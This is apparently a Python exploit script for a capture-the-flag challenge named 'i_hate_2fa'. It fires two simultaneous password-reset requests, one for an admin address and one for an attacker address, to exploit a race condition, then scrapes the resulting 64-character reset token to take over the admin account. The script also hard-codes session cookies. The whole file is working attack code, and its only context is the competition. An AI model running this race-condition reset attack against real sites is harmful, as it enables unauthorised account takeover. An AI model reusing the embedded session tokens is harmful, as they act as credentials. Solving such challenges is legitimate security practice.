import requests
import threading
import re
import time


URL = "http://i_hate_2fa.quals.sigint.mx"
## Token Instance => retrived after log in
COOKIES = {
    "Instancer-Token": "eyJib2R5IjogImV5SjFjMlZ5Ym1GdFpTSTZJQ0prWldJeU16WmxObVE0Wm1JMk9HRmhObVpsTkRJeE5XVXlNMk14WW1KbE4yUTNOakpqWXpFMk9ERmtaakUyWTJOaFlqQTVaVEprTnpJME4yUXdZVEppSWl3Z0ltVjRjR2x5ZVY5MGFXMWxJam9nTVRjM01URTJPRGd4TUM0d09EazJPVGg5IiwgInNpZ25hdHVyZSI6ICJjYkdTK0FOM1hBRlZKM1AxVkVmTGdkaDcrLzlpaVlabzBIUzNnMVFxb3J1V2IyM1lDNDJHY3o5TGxpZmJHZzBXdktPbDZkZGwyd284RU9iMlUxejNpdz09In0=",
    "connect.sid": "s:Rdz5tsXlzGXG8vYrIcz9DIPf1RCqje71.4xx4tKeqLTIux9sIub7eMdoO02kM9jsGW9miwenfYxU"
}

def post(email):
    try:
        requests.post(f"{URL}/forgot-password", data={"email": email}, cookies=COOKIES, timeout=5)
    except:
        pass

#Threading => race condtion
print("[*] Starting exploit")
t1 = threading.Thread(target=post, args=("admin@example.com",))
t2 = threading.Thread(target=post, args=("attacker@example.com",))
t1.start()
t2.start()
t1.join()
t2.join()

# let the server process requests
time.sleep(1)

# get token
print("[*] Getting Token...")
r = requests.get(f"{URL}/reset", cookies=COOKIES)
token = re.search(r'value="([a-f0-9]{64})"', r.text) # catch token generated

if token:
    print(f"\n[+] TOKEN: {token.group(1)}")
    print("[!] Admin reset token mights have been overrided")
else:
    print("\n[-] No token. ")
